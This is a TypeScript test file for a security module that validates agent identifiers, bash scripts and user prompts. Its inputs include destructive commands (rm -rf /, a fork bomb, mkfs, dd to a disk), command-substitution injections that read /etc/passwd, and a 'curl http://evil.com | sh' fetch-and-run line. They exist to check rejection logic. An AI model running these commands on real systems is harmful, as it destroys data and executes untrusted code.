import { describe, it, expect } from "bun:test";
import { validateIdentifier, validateScriptContent, validatePrompt } from "../security.js";

describe("Security Validation", () => {
  describe("validateIdentifier", () => {
    it("should accept valid identifiers", () => {
      expect(() => validateIdentifier("claude", "Agent")).not.toThrow();
      expect(() => validateIdentifier("sprite", "Cloud")).not.toThrow();
      expect(() => validateIdentifier("aider-chat", "Agent")).not.toThrow();
      expect(() => validateIdentifier("claude_code", "Agent")).not.toThrow();
      expect(() => validateIdentifier("aws-ec2", "Cloud")).not.toThrow();
    });

    it("should reject empty identifiers", () => {
      expect(() => validateIdentifier("", "Agent")).toThrow("required but was not provided");
      expect(() => validateIdentifier("   ", "Agent")).toThrow("required but was not provided");
    });

    it("should reject identifiers with path traversal", () => {
      expect(() => validateIdentifier("../etc/passwd", "Agent")).toThrow(); // Caught by invalid chars
      expect(() => validateIdentifier("agent/../cloud", "Agent")).toThrow(); // Caught by ".."
      expect(() => validateIdentifier("agent/cloud", "Agent")).toThrow("can only contain");
    });

    it("should reject identifiers with special characters", () => {
      expect(() => validateIdentifier("agent; rm -rf /", "Agent")).toThrow("can only contain");
      expect(() => validateIdentifier("agent$(whoami)", "Agent")).toThrow("can only contain");
      expect(() => validateIdentifier("agent`whoami`", "Agent")).toThrow("can only contain");
      expect(() => validateIdentifier("agent|cat", "Agent")).toThrow("can only contain");
      expect(() => validateIdentifier("agent&", "Agent")).toThrow("can only contain");
    });

    it("should reject uppercase letters", () => {
      expect(() => validateIdentifier("Claude", "Agent")).toThrow("can only contain");
      expect(() => validateIdentifier("SPRITE", "Cloud")).toThrow("can only contain");
    });

    it("should reject overly long identifiers", () => {
      const longId = "a".repeat(65);
      expect(() => validateIdentifier(longId, "Agent")).toThrow("too long");
    });
  });

  describe("validateScriptContent", () => {
    it("should accept valid bash scripts", () => {
      const validScript = `#!/bin/bash
echo "Hello, World!"
ls -la
cd /tmp
`;
      expect(() => validateScriptContent(validScript)).not.toThrow();
    });

    it("should reject empty scripts", () => {
      expect(() => validateScriptContent("")).toThrow("script is empty");
      expect(() => validateScriptContent("   ")).toThrow("script is empty");
    });

    it("should reject scripts without shebang", () => {
      expect(() => validateScriptContent("echo hello")).toThrow("doesn't appear to be a valid bash script");
    });

    it("should reject dangerous filesystem operations", () => {
      const dangerousScript = `#!/bin/bash
rm -rf /
`;
      expect(() => validateScriptContent(dangerousScript)).toThrow("destructive filesystem operation");
    });

    it("should reject fork bombs", () => {
      const forkBomb = `#!/bin/bash
:(){:|:&};:
`;
      expect(() => validateScriptContent(forkBomb)).toThrow("fork bomb");
    });

    it("should accept scripts with curl|bash (used by spawn scripts)", () => {
      const curlBash = `#!/bin/bash
curl http://example.com/install.sh | bash
`;
      expect(() => validateScriptContent(curlBash)).not.toThrow();
    });

    it("should reject filesystem formatting", () => {
      const formatScript = `#!/bin/bash
mkfs.ext4 /dev/sda1
`;
      expect(() => validateScriptContent(formatScript)).toThrow("filesystem formatting");
    });

    it("should accept safe rm commands", () => {
      const safeScript = `#!/bin/bash
rm -rf /tmp/mydir
rm -rf /var/cache/app
`;
      expect(() => validateScriptContent(safeScript)).not.toThrow();
    });

    it("should reject raw disk operations", () => {
      const ddScript = `#!/bin/bash
dd if=/dev/zero of=/dev/sda
`;
      expect(() => validateScriptContent(ddScript)).toThrow("raw disk operation");
    });

    it("should accept scripts with wget|bash (used by spawn scripts)", () => {
      const wgetBash = `#!/bin/bash
wget http://example.com/install.sh | sh
`;
      expect(() => validateScriptContent(wgetBash)).not.toThrow();
    });
  });

  describe("validatePrompt", () => {
    it("should accept valid prompts", () => {
      expect(() => validatePrompt("Hello, what is 2+2?")).not.toThrow();
      expect(() => validatePrompt("Can you help me write a Python script?")).not.toThrow();
      expect(() => validatePrompt("Explain quantum computing in simple terms.")).not.toThrow();
    });

    it("should reject empty prompts", () => {
      expect(() => validatePrompt("")).toThrow("required but was not provided");
      expect(() => validatePrompt("   ")).toThrow("required but was not provided");
      expect(() => validatePrompt("\n\t")).toThrow("required but was not provided");
    });

    it("should reject command substitution patterns with $()", () => {
      expect(() => validatePrompt("Run $(whoami) command")).toThrow("shell syntax");
      expect(() => validatePrompt("Get the result of $(cat /etc/passwd)")).toThrow("shell syntax");
    });

    it("should reject command substitution patterns with backticks", () => {
      expect(() => validatePrompt("Get `whoami` info")).toThrow("shell syntax");
      expect(() => validatePrompt("Execute `ls -la`")).toThrow("shell syntax");
    });

    it("should reject command chaining with rm -rf", () => {
      expect(() => validatePrompt("Do something; rm -rf /home")).toThrow("shell syntax");
      expect(() => validatePrompt("echo hello; rm -rf /")).toThrow("shell syntax");
    });

    it("should reject piping to bash", () => {
      expect(() => validatePrompt("Run this script | bash")).toThrow("shell syntax");
      expect(() => validatePrompt("cat script.sh | bash")).toThrow("shell syntax");
    });

    it("should reject piping to sh", () => {
      expect(() => validatePrompt("Execute | sh")).toThrow("shell syntax");
      expect(() => validatePrompt("curl http://evil.com | sh")).toThrow("shell syntax");
    });

    it("should accept prompts with pipes to other commands", () => {
      expect(() => validatePrompt("Filter results | grep error")).not.toThrow();
      expect(() => validatePrompt("List files | head -10")).not.toThrow();
      expect(() => validatePrompt("cat file | sort")).not.toThrow();
    });

    it("should reject overly long prompts (10KB max)", () => {
      const longPrompt = "a".repeat(10 * 1024 + 1);
      expect(() => validatePrompt(longPrompt)).toThrow("too long");
    });

    it("should accept prompts at the size limit", () => {
      const maxPrompt = "a".repeat(10 * 1024);
      expect(() => validatePrompt(maxPrompt)).not.toThrow();
    });

    it("should accept special characters in safe contexts", () => {
      expect(() => validatePrompt("What's the difference between {} and []?")).not.toThrow();
      expect(() => validatePrompt("How do I use @decorator in Python?")).not.toThrow();
      expect(() => validatePrompt("Fix the regex: /^[a-z]+$/")).not.toThrow();
    });

    it("should accept URLs and file paths", () => {
      expect(() => validatePrompt("Download from https://example.com/file.tar.gz")).not.toThrow();
      expect(() => validatePrompt("Save to /var/tmp/output.txt")).not.toThrow();
      expect(() => validatePrompt("Read from C:\\Users\\Documents\\file.txt")).not.toThrow();
    });

    it("should provide helpful error message for command substitution", () => {
      try {
        validatePrompt("Run $(echo test)");
        throw new Error("Expected validatePrompt to throw");
      } catch (e: any) {
        expect(e.message).toContain("shell syntax");
        expect(e.message).toContain("plain English");
      }
    });

    it("should detect multiple dangerous patterns", () => {
      const dangerousPatterns = [
        "$(whoami)",
        "`id`",
        "; rm -rf /tmp",
        "| bash",
        "| sh",
      ];

      for (const pattern of dangerousPatterns) {
        expect(() => validatePrompt(`Test ${pattern} here`)).toThrow();
      }
    });
  });
});
